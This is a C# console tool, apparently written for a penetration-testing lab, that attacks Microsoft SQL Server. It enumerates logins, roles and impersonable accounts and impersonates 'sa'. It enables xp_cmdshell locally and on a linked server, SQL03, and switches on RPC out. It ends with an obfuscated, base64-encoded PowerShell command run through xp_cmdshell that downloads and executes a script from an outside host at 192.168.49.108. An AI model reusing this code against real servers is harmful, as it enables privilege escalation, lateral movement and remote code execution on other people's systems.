﻿using System;
using System.Data;
using System.Data.SqlClient;

namespace MSSQLTest
{
    public class Program
    {
        public static void Main(string[] args)
        {

            //Console.WriteLine("Please enter your Server name ...");
            //String sqlServer = Console.ReadLine();
            String sqlServer = "web06.dev.final.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            bool issystemadmin = false;
            bool shelldisabled = false;

            bool dblink_issystemadmin = false;
            bool dblink_shelldisabled = false;
            bool dblink_rpcdisabled = false;


            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
                //Console.ReadLine();

            }
            catch
            {
                Console.WriteLine("Auth failed");
                //Console.ReadLine();
                Environment.Exit(0);
            }

            String queryservername = "SELECT @@servername";
            SqlCommand command = new SqlCommand(queryservername, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in ServerName: " + reader[0]);
            reader.Close();

            String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();
            //Console.ReadLine();

            String queryloginmapping = "SELECT USER_NAME();";
            command = new SqlCommand(queryloginmapping, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to the user: " + reader[0]);
            reader.Close();
            //Console.ReadLine();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();
            //Console.ReadLine();

            String queryadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(queryadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of sysadmin role");
                issystemadmin = true;
            }
            else
            {
                Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();
            //Console.ReadLine();


            if (issystemadmin)
            {
                Console.WriteLine("Trying move to sa ...");
                //try move to sa
                String executeas = "EXECUTE AS LOGIN = 'sa';";
                command = new SqlCommand(executeas, con);
                reader = command.ExecuteReader();
                reader.Close();

                //String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Logged in as: " + reader[0]);
                reader.Close();


            }



            //try read xp_cmdshell
            String querycmdshell = "select * from sys.configurations where name = 'xp_cmdshell';";
            command = new SqlCommand(querycmdshell, con);
            reader = command.ExecuteReader();
            if (reader.HasRows)
            {
                reader.Read();
                Int32 value = Int32.Parse(reader[2].ToString());
                if (value == 1)
                {
                    Console.WriteLine("xp_cmdshell is enabled");
                }
                else
                {
                    Console.WriteLine("xp_cmdshell is disabled");
                    shelldisabled = true;
                }
                Int32 value_in_use = Int32.Parse(reader[5].ToString());
                if (value_in_use == 1)
                {
                    Console.WriteLine("xp_cmdshell is in_use enabled");
                }
                else
                {
                    Console.WriteLine("xp_cmdshell is in_use disabled");
                }
            }
            else
            {
                Console.WriteLine("No access to xp_cmdshell");
            }

            
            reader.Close();
            //Console.ReadLine();
            //try enable if system admin

            if (shelldisabled && issystemadmin)
            {
                String querycmdshellenable1 = "sp_configure 'Show Advanced Options', 1; RECONFIGURE;";
                String querycmdshellenable2 = "sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                command = new SqlCommand(querycmdshellenable1, con);
                reader = command.ExecuteReader();
                if (reader.HasRows)
                {
                    Console.WriteLine("There should not be outputs ...");
                }
                else
                {
                    Console.WriteLine("querycmdshellenable1 success");
                }
                reader.Close();

                command = new SqlCommand(querycmdshellenable2, con);
                reader = command.ExecuteReader();
                if (reader.HasRows)
                {
                    Console.WriteLine("There should not be outputs ...");
                }
                else
                {
                    Console.WriteLine("querycmdshellenable2 success");
                }
                reader.Close();

                //String querycmdshell = "select * from sys.configurations where name = 'xp_cmdshell';";
                //check again ...
                command = new SqlCommand(querycmdshell, con);
                reader = command.ExecuteReader();
                if (reader.HasRows)
                {
                    reader.Read();
                    Int32 value = Int32.Parse(reader[2].ToString());
                    if (value == 1)
                    {
                        Console.WriteLine("xp_cmdshell is enabled");
                    }
                    else
                    {
                        Console.WriteLine("xp_cmdshell is disabled");
                        shelldisabled = true;
                    }
                    Int32 value_in_use = Int32.Parse(reader[5].ToString());
                    if (value_in_use == 1)
                    {
                        Console.WriteLine("xp_cmdshell is in_use enabled");
                    }
                    else
                    {
                        Console.WriteLine("xp_cmdshell is in_use disabled");
                    }
                }
                else
                {
                    Console.WriteLine("No access to xp_cmdshell");
                }

            }

            //get sql link
            String dblink = "EXEC sp_linkedservers;";
            command = new SqlCommand(dblink, con);
            reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            reader.Close();

            String databasenameqery = "SELECT name FROM master.sys.databases";
            command = new SqlCommand(databasenameqery, con);
            reader = command.ExecuteReader();
            if (reader.HasRows)
            {
                while (reader.Read() == true)
                {
                    Console.WriteLine("Found database name: " + reader[0]);
                }
            }
            else
            {
                Console.WriteLine("There is no database ??");
            }

            reader.Close();

            String usernamequery1 = "SELECT name FROM sys.syslogins";
            command = new SqlCommand(usernamequery1, con);
            reader = command.ExecuteReader();
            if (reader.HasRows)
            {
                while (reader.Read() == true)
                {
                    Console.WriteLine("Found syslogins: " + reader[0]);
                }
            }
            else
            {
                Console.WriteLine("There is no syslogins ??");
            }

            reader.Close();

            String usernamequery2 = "SELECT name FROM sys.server_principals";
            command = new SqlCommand(usernamequery2, con);
            reader = command.ExecuteReader();
            if (reader.HasRows)
            {
                while (reader.Read() == true)
                {
                    Console.WriteLine("Found server principals: " + reader[0]);
                }
            }
            else
            {
                Console.WriteLine("There is no server principals ??");
            }

            reader.Close();

            String impquery = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(impquery, con);
            reader = command.ExecuteReader();
            if (reader.HasRows)
            {
                while (reader.Read() == true)
                {
                    Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                }
            }
            else
            {
                Console.WriteLine("There is no login to be impresonated as ...");
            }
                
            reader.Close();

            //SELECT name FROM master.sys.databases
            //SELECT name FROM sys.syslogins
            //SELECT name FROM sys.server_principals
            //SELECT @@servername

            bool trydblink = true;

            if (trydblink)
            {

                String dblink_target = "SQL03";

                String dblink_check = "select version from openquery(\"" + dblink_target + "\", 'select @@version as version')";
                command = new SqlCommand(dblink_check, con);
                reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();

                String dblink_cmdshell = "SELECT* FROM OPENQUERY(\"" + dblink_target + "\", 'select * from sys.configurations where name = ''xp_cmdshell''')";
                command = new SqlCommand(dblink_cmdshell, con);
                reader = command.ExecuteReader();

                if (reader.HasRows)
                {
                    reader.Read();
                    Int32 value = Int32.Parse(reader[2].ToString());
                    if (value == 1)
                    {
                        Console.WriteLine("xp_cmdshell is enabled on " + dblink_target);
                    }
                    else
                    {
                        Console.WriteLine("xp_cmdshell is disabled on " + dblink_target);
                        dblink_shelldisabled = true;
                    }
                    Int32 value_in_use = Int32.Parse(reader[5].ToString());
                    if (value_in_use == 1)
                    {
                        Console.WriteLine("xp_cmdshell is in_use enabled on " + dblink_target);
                    }
                    else
                    {
                        Console.WriteLine("xp_cmdshell is in_use disabled on " + dblink_target);
                    }
                }
                else
                {
                    Console.WriteLine("No access to xp_cmdshell on " + dblink_target);
                }

                reader.Close();

                String dblink_servername = "SELECT* FROM OPENQUERY(\"" + dblink_target + "\", 'SELECT @@servername')";
                command = new SqlCommand(dblink_servername, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Logged in ServerName (" + dblink_target + "): " + reader[0]);
                reader.Close();

                String dblink_login = "SELECT* FROM OPENQUERY(\"" + dblink_target + "\", 'SELECT SYSTEM_USER')";
                command = new SqlCommand(dblink_login, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Logged in as (" + dblink_target + "): " + reader[0]);
                reader.Close();
                //Console.ReadLine();

                String dblink_loginmapping = "SELECT* FROM OPENQUERY(\"" + dblink_target + "\", 'SELECT USER_NAME()')";
                command = new SqlCommand(dblink_loginmapping, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Mapped to the user (" + dblink_target + "): " + reader[0]);
                reader.Close();
                //Console.ReadLine();

                String dblink_publicrole = "SELECT* FROM OPENQUERY(\"" + dblink_target + "\", 'SELECT IS_SRVROLEMEMBER(''public'')')";
                command = new SqlCommand(dblink_publicrole, con);
                reader = command.ExecuteReader();
                reader.Read();
                Int32 dblink_role = Int32.Parse(reader[0].ToString());
                if (dblink_role == 1)
                {
                    Console.WriteLine("User is a member of public role on " + dblink_target);
                }
                else
                {
                    Console.WriteLine("User is NOT a member of public role on " + dblink_target);
                }
                reader.Close();
                //Console.ReadLine();

                String dblink_adminrole = "SELECT* FROM OPENQUERY(\"" + dblink_target + "\", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')";
                command = new SqlCommand(dblink_adminrole, con);
                reader = command.ExecuteReader();
                reader.Read();
                dblink_role = Int32.Parse(reader[0].ToString());
                if (dblink_role == 1)
                {
                    Console.WriteLine("User is a member of sysadmin role on " + dblink_target);
                    dblink_issystemadmin = true;
                }
                else
                {
                    Console.WriteLine("User is NOT a member of sysadmin role on " + dblink_target);
                }
                reader.Close();

                //check rpc out
                String dblink_rpc = "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '" + dblink_target + "';";
                command = new SqlCommand(dblink_rpc, con);
                reader = command.ExecuteReader();
                if (reader.HasRows)
                {
                    reader.Read();

                    bool dblink_rpcen = bool.Parse(reader[0].ToString());
                    if (dblink_rpcen)
                    {
                        Console.WriteLine("RPC out is enabled on " + dblink_target);
                    }
                    else
                    {
                        Console.WriteLine("RPC out is disabled on " + dblink_target);
                        dblink_rpcdisabled = true;
                    }
                }
                else
                {
                    Console.WriteLine("No access to RPC out");
                }

                reader.Close();

                if (dblink_rpcdisabled)
                {
                    String dblink_enrpc = "EXEC sp_serveroption '" + dblink_target + "', 'rpc out', 'true';";
                    command = new SqlCommand(dblink_enrpc, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    //String dblink_rpc = "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '" + dblink_target + "';";
                    command = new SqlCommand(dblink_rpc, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    bool dblink_rpcen = bool.Parse(reader[0].ToString());
                    if (dblink_rpcen)
                    {
                        Console.WriteLine("RPC out is enabled on " + dblink_target);
                    }
                    else
                    {
                        Console.WriteLine("PRC out is disabled on " + dblink_target);
                    }
                    reader.Close();

                }

                if (dblink_shelldisabled && dblink_issystemadmin)
                {
                    String querycmdshellenable1 = "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + dblink_target + "]";
                    String querycmdshellenable2 = "EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + dblink_target + "]";
                    command = new SqlCommand(querycmdshellenable1, con);
                    reader = command.ExecuteReader();
                    if (reader.HasRows)
                    {
                        Console.WriteLine("There should not be outputs ...");
                    }
                    else
                    {
                        Console.WriteLine("querycmdshellenable1 success");
                    }
                    reader.Close();

                    command = new SqlCommand(querycmdshellenable2, con);
                    reader = command.ExecuteReader();
                    if (reader.HasRows)
                    {
                        Console.WriteLine("There should not be outputs ...");
                    }
                    else
                    {
                        Console.WriteLine("querycmdshellenable2 success");
                    }
                    reader.Close();

                    //String dblink_cmdshell = "select * from sys.configurations where name = 'xp_cmdshell';";
                    //check again ...
                    command = new SqlCommand(dblink_cmdshell, con);
                    reader = command.ExecuteReader();
                    if (reader.HasRows)
                    {
                        reader.Read();
                        Int32 value = Int32.Parse(reader[2].ToString());
                        if (value == 1)
                        {
                            Console.WriteLine("xp_cmdshell is enabled on " + dblink_target);
                        }
                        else
                        {
                            Console.WriteLine("xp_cmdshell is disabled on " + dblink_target);
                        }
                        Int32 value_in_use = Int32.Parse(reader[5].ToString());
                        if (value_in_use == 1)
                        {
                            Console.WriteLine("xp_cmdshell is in_use enabled on " + dblink_target);
                        }
                        else
                        {
                            Console.WriteLine("xp_cmdshell is in_use disabled on " + dblink_target);
                        }
                    }
                    else
                    {
                        Console.WriteLine("No access to xp_cmdshell on " + dblink_target);
                    }
                    reader.Close();
                }//end of try enable xp_cmdshell

                bool tryexploit = true;
                //SELECT * FROM OPENQUERY("[remote sql]", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')
                if (tryexploit)
                {
                    Console.WriteLine("Trying to exploit ...");
                    String exploit = "SELECT * FROM OPENQUERY(\"" + dblink_target + "\", 'select @@servername; exec xp_cmdshell ''powershell -enc aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAwADgAOgA4ADAAOAAwAC8ASQBuAHYAbwBrAGUALQBoAGkAZABkAGUAbgB0AGUAcwB0AGEAdQB0AG8AcgBlAGYALgBwAHMAMQAnACkAKQA=''')";
                    command = new SqlCommand(exploit, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }//end of tryexploit
            }//end of trydblink

            //ShowSqlErrorsAndInfo(conString, querycmdshell);

            con.Close();

        }

        public static void ShowSqlErrorsAndInfo(string connectionString, string query)
        {
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                connection.StateChange += OnStateChange;
                connection.InfoMessage += OnInfoMessage;

                SqlCommand command = new SqlCommand(query, connection);
                try
                {
                    command.Connection.Open();
                    Console.WriteLine("Command execution starting.");
                    SqlDataReader dr = command.ExecuteReader();
                    if (dr.HasRows)
                    {
                        Console.WriteLine("Rows returned.");
                        while (dr.Read())
                        {
                            Console.WriteLine("New Rows: ");
                            for (int idx = 0; idx < dr.FieldCount; idx++)
                            {
                                Console.Write("{0} ", dr[idx].ToString());
                            }

                            Console.WriteLine();
                        }
                    }

                    Console.WriteLine("Command execution complete.");
                }
                catch (SqlException ex)
                {
                    DisplaySqlErrors(ex);
                }
                finally
                {
                    command.Connection.Close();
                }
            }
        }

        private static void DisplaySqlErrors(SqlException exception)
        {
            foreach (SqlError err in exception.Errors)
            {
                Console.WriteLine("ERROR: {0}", err.Message);
            }
        }

        private static void OnInfoMessage(object sender, SqlInfoMessageEventArgs e)
        {
            foreach (SqlError info in e.Errors)
            {
                Console.WriteLine("INFO: {0}", info.Message);
            }
        }

        private static void OnStateChange(object sender, StateChangeEventArgs e)
        {
            Console.WriteLine("Connection state changed: {0} => {1}", e.OriginalState, e.CurrentState);
        }



    }

    


}
